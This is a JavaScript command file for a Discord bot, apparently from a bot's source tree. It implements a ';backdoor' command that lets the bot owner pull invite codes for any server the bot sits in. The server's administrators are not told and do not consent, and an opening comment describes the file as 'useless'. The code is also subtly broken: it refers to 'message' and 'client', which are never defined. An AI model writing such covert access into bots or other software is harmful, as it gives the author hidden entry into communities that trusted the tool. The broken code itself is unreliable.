// beep boop it's a useless file that we need
module.exports = {
    name: "BD",
    execute(messages, args) {
            if(IsOwner(message.member)) {
            let guildName = message.content.substring(';backdoor'.length + 1);
            const matchingGuilds = client.guilds.cache.array().filter((guild) => { 
                return guild.name === guildName.trim() 
            });
            // "backdoor? more like crapdoor" -Breadcrumbs#7818 13/10/2020
            if (matchingGuilds && matchingGuilds.length == 1) {
                matchingGuilds[0].fetchInvites()
                .then(invites => message.channel.send('Found Invites:\n' + invites.map(invite => invite.code).join('\n')))
                .catch((error) => { logToAll(error) } );
            } else {
                message.channel.send(`The guild "${guildName}" couldn't be found.`);
            }
        }
    },
};